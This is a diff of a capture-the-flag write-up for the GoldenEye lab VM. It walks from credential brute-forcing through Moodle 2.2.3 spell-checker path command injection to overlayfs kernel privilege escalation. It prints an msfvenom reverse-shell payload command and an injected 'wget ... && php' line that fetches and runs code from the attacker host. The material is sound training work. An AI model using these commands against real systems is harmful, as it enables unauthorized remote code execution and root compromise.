@@ -70,116 +70,81 @@ This email was missed by the above regexes because it required interaction with 
 
 We head back to the SMTP service and run `VRFY doak` which presents us with a message that confirms the user is known to the mailserver. Then we run another bruteforce against the user with the same fasttrack.txt wordlist and quickly secure a valid creds.
 
-Upon getting the users messages with **STAT** (to view the number of messages) and **RETR x** (where x is the message number), we obtain credentials for dr_doak's Moodle account. We once again enumerate Moodle, but this time in the context of the new user's account. There's a file which has been uploaded by the user which points us to a hidden web directory.
-
+Upon getting the users messages with **STAT** (to view the number of messages) and **RETR x** (where x is the message number), we obtain credentials for dr_doak's Moodle account. We once again enumerate Moodle, but this time in the context of the new user's account. There's a file which has been uploaded by the user.
 ![dr_doak_hint](https://user-images.githubusercontent.com/15524701/43061197-e9acb59a-8e19-11e8-93a5-5d22a67f5564.jpeg)
 
 
-a hint pointing us to another directory on the server which contains some sort of useful information that can't be communicated over email. We travel to the directory and all we find there is an image. 
-
+The file contents disclose another hidden resource on the server which apparently contain administrator credentials. 
 ![dr_doak_hint2](https://user-images.githubusercontent.com/15524701/43061198-e9c125b6-8e19-11e8-9771-52f6257ef385.jpeg)
 
 
-I downloaded the image and ran `strings` over it and some of the exif data appeared to contain a base64 encoded string. I decoded this with 
-`python -c 'import base64;s=base64.b64decode("eFdpbnRlcjE5OTV4IQ==");print s'`
+I downloaded the image hosted at that location and ran `strings` over it and some of the exif data appeared to contain a base64 encoded string. 
+I decoded this with `python -c 'import base64;s=base64.b64decode("eFdpbnRlcjE5OTV4IQ==");print s'`
 
-administrator credentials for the Moodle site at severnaya-station.com/gnocertdir. 
+
 
 This next part was a bit difficult. 
 
-With admin creds i searched about the application for additional information disclosure without much success. The application was very extensive, but leveraging concepts from The Web App Hackers Handbook, I decided to click through every single link on exposed via the admin credentials and explore every feature. 
+With admin creds i searched about the application for additional information disclosure without much success. The application had a very large collection of features and links; per the methodology professed in the Web App Hacker's Handbook I clicked through every single link exposed via the admin credentials and explored each page. 
 
-I came upon a section that appeared to allow the input of shell commands into fields meant to specify the paths of different plugins. The application mentioned a path to aspell but the text editors in use on this web app didn’t appear to include aspell (they did include pspell and a google service, though). I decided to look around a bit more.
-
-
-Looking up several exploits for Moodle on exploit-db didn’t appear to be fruitful. It was also difficult to determine what version of Moodle was running on the server and hence understand which exploits might work. Looking into the spidered pages a bit more, there was a plugin directory which mentioned tinyMCE and YUI, as well as the corresponding version numbers of these applications.
-
-I searched google for Moodle changelogs and was able to determine the versions of tinyMCE and YUI appeared to have shipped with version 2.2.3. This also was corroborated by a few pages in /gnocertdir having 2.2.3 in the headers with no other context. 
-
-Armed with this information i went back through the exploit-db exploits, and also decided to search about in metasploit (after launching metasploit with msfconsole enter search moodle and wait for results to appear). The following exploit is the only result for moodle, and appears to target version 2.2.3. Putting in the admin creds and targeting the site, the exploit runs but failed to generate a shell. I looked further into the source code and noticed it was trying to target the same area of the application referenced in the system path page, which appeared to have the ability to run shell commands.
+I came upon a section that appeared to allow the input of shell commands into fields meant to specify the paths of different plugins. 
 
 ![systempaths](https://user-images.githubusercontent.com/15524701/43056875-60002f44-8e04-11e8-845b-96883d2bba3a.jpeg)
 
+The application mentioned a path to **aspell**, a spell cheak application, but the editor in use on this web app didn’t appear to include aspell (it did include pspell and a google service, though). I decided to look around a bit more.
 
-I had been confused earlier as the exploits noted appeared to target aspell, but the tinyMCE editor only had PSpell listed as an available plugin. However a quick google search showed that PSpell was dependent on aspell installations, so I surmised this dependency could trigger the vulnerability. First I created my payload: 
 
-sudo msfvenom -p php/reverse_perl lhost=172.16.2.2 lport=443 -f raw -o /var/www/html/phprev443perl.php
+Looking up several exploits for Moodle on exploit-db didn’t appear to be fruitful. It was also difficult to determine what version of Moodle was running on the server and hence understand which exploits might work. Looking into my site-map built out by my browsing and spidering in **OWASP ZAP** a bit more, I noticed something I'd missed before: a plugin directory which mentioned tinyMCE and YUI, as well as the corresponding version numbers of these applications.
+
+I searched google for Moodle changelogs and was able to determine the versions of tinyMCE and YUI appeared to have shipped with version 2.2.3. This also was corroborated by a few pages in /gnocertdir having 2.2.3 in the headers with no other context. 
+
+Armed with this information i went back through the exploit-db exploits, and also decided to search about in Metasploit (after launching Metasploit with `msfconsole` enter `search moodle` and wait for results to appear). The following exploit is the only result for moodle, and appears to target version 2.2.3:https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec 
+
+I attempted to fire off this MSF exploit, and the exploit ran but failed to generate a shell. I looked further into the source code of the module and noticed it was apparently trying to target the same area of the application I was looking at earlier which referenced the system path of the **aspell** plugin.
+
+I had been confused earlier as the exploits noted appeared to target **aspell**, while the tinyMCE editor only had PSpell listed as an available plugin on its Moodle configuration page. However a quick Google search showed that PSpell was dependent on aspell installations, so I surmised this dependency could trigger the vulnerability. First I created my payload: 
+
+`sudo msfvenom -p php/reverse_perl lhost=172.16.2.2 lport=443 -f raw -o /var/www/html/phprev443perl.php`
 
 I then manually edited the sh command that was originally meant to trigger the spell checker to read:
 
-sh -c '(wget 172.16.2.2/phprev443perl.php -O/tmp/phprev443perl.php && php /tmp/phprev443perl.php)'
+`sh -c '(wget 172.16.2.2/phprev443perl.php -O/tmp/phprev443perl.php && php /tmp/phprev443perl.php)'`
 
 After setting up my listener, I then navigated to a page that had a text editor running, and looked for the spellcheck option.
 ![spellcheck](https://user-images.githubusercontent.com/15524701/43056874-5fec938a-8e04-11e8-900c-2038c113d74d.jpeg)
 
 (The rightmost button in the bottom row activates the spellcehck feature).
 
-Clicking the button triggered my command and the reverse shell was sent to the C2 system in the context of the remote user www-data, widely known as the low-priv apache user meant to prevent successfuly RCE attacks against apache from giving root privileges.
+Clicking the button triggered my command and the reverse shell was sent to the C2 system in the context of the remote user www-data, the low-priv apache account meant to prevent successful RCE attacks against Apache servers from giving root privileges.
 
 
-
-Post Exploitation
-First and most importantly, I upgraded my shell to a pseudo tty. This helps increase the types of commands we can run without failure, which can include things such as the cd command. Since python is installed, we can use the trusty pty module:
+#Post Exploitation
+First, I upgraded my shell to a pseudo tty. This helps increase the sorts of commands we can run without failure, which can include things such as the `su` and `cd`. Since ``python`` is installed, we can use the trusty pty module:
 python -c 'import pty;pty.spawn("/bin/bash")'
 
-If it weren’t, we could get socat from our C2 machine and use that alternatively. A nifty guide on shell upgrades can be found here: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+If it weren’t, we could get **socat** from our C2 machine and use that alternatively. A nifty guide on shell upgrades can be found here: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
 With an upgraded shell, I began to scan the directories of the webserver, /var/www/html/ for additional information. 
 
-I also poked in the server root in /etc/apache2. navigating there, I found a .htpasswd file which contained creds for 2 users, boris and ops. I already had Boris’ creds from earlier, so I tried to crack ops’ creds. Utilizing hashcat, i employed several million words (the entirety of the seclists/passwords wordlist suite hosted on github) and failed to crack ops’ password. I then did a straight bruteforce up to 6 characters including special chars and failed to get a match. 7 chars would have taken 4 days, so I determined that wasn’t going to be the way in. 
+I also poked in the server root in /etc/apache2. navigating there, I found a .htpasswd file which contained creds for 2 users, _boris_ and _ops_. htpasswd contains login credentials used to access pages protected by basic auth on the Apache server (in this case the /sev-home/ directory). I already had Boris’ creds from earlier, so I tried to crack ops’ creds. Utilizing hashcat, i employed several million words (the entirety of the seclists/passwords wordlist suite hosted on github) and failed to crack ops’ password. I then did a straight bruteforce up to 6 characters including special chars and failed to get a match. 7 chars would have taken 4 days, so I determined that wasn’t going to be the way in. 
 
 Going back to the /var/www/html/ directory, i started to grep for more mentions of the usernames, boris, natalya, and so on. I found a mention in a page I hadn’t explored yet `severnaya-station.com/splashAdmin.php`
 
-Navigating here, we get a sort of message board between a few users, with an admin mentioning that GCC had been removed from the box and replaced by a FreeBSD alternative. I did some quick searching and found this to be clang, which has LLVM as a backend. This is a gcc compatible compiling engine created as an alternative to gcc at least in part thanks to some differences of political and technical opinion between the relevant camps.
+Navigating here, we get a sort of message board containing chatter between a few users, with an admin mentioning that GCC had been removed from the box and replaced by a FreeBSD alternative. I did some quick searching and found this alternative app to be `clang`, which has LLVM as a backend. This is a gcc compatible compiling engine created as an alternative to gcc at least in part due to some differences of political and technical opinion between the relevant camps.
 
-This was a dead giveaway that the host might be vulnerable to a kernel exploit. Running uname -a indicated the host was running linux kernel 3.13.0-32. Searchsploit indicated this was vulnerable to a well known overlayfs privilege escalation flaw. 
+The chatter about compilers was a dead giveaway that the host might be vulnerable to a kernel exploit. Running uname -a indicated the host was running linux kernel 3.13.0-32. Searchsploit indicated this was vulnerable to a well known overlayfs privilege escalation flaw. 
 
-The source of the exploit with searchsploit -x 37292, there was a single reference to gcc which i replaced with clang. I wasn’t sure if the machine had the FS_USERNS_MOUNT flag enabled, which is a pre-requisite of this exploit. Checking in /boot/config-3.13.0-32-generic for the flag, i found no references to it. This was not promising.
-cat /boot/config-3.13.0-32-generic | grep -i fs_userns
+The source of the exploit with searchsploit -x 37292, there was a single reference to `gcc` which i replaced with `clang`. I wasn’t sure if the machine had the FS_USERNS_MOUNT flag enabled, a pre-requisite for this exploit to run. Checking in /boot/config-3.13.0-32-generic for the flag with `cat /boot/config-3.13.0-32-generic | grep -i fs_userns`, I found no references to it. This was not promising.
 
-However I wasn’t sure if this was conclusive, and the exploit itself contained error output in the event the FS_USERNS_MOUNT flag wasn’t enabled, so I went for it anyway. 
+However I wasn’t sure this was conclusive, and the exploit itself contained verbose error output in the event the FS_USERNS_MOUNT flag wasn’t enabled, so I went for it anyway since that would be a more conclusive test. 
 
-I used curl to download the source for the exploit to /tmp/ on the goldeneye host, and compiled it with clang ofs.c -o ofs
+I used curl to download the source for the exploit to /tmp/ on the goldeneye host, and compiled it with `clang ofs.c -o ofs`
 
 Several ugly looking warnings were generated, but unlike errors, warnings aren’t fatal.
-I ran the compiled binary and the repl shifted to a newline and displayed #.
-running whoami confirmed I had root privileges. I navigated to the /root/ dir, viewed the flag, and treated myself to the reward left by the author, which anyone who’s seen Goldeneye will appreciate.
+I ran the compiled binary and the repl shifted to a newline and displayed a symbol
+**#**
+
+Running whoami confirmed I had root privileges. I navigated to the /root/ dir, viewed the flag, and treated myself to the reward left by the author, which anyone who’s seen Goldeneye will appreciate.
 ![flag](https://user-images.githubusercontent.com/15524701/43056868-5f6dea80-8e04-11e8-903e-faef98967592.jpeg)
 ![flag_anim](https://user-images.githubusercontent.com/15524701/43056869-5f81dfb8-8e04-11e8-8736-58a2fdac56a0.jpeg)
 #
-
-
-
-
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/PortWhisperer/CTFWriteups/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
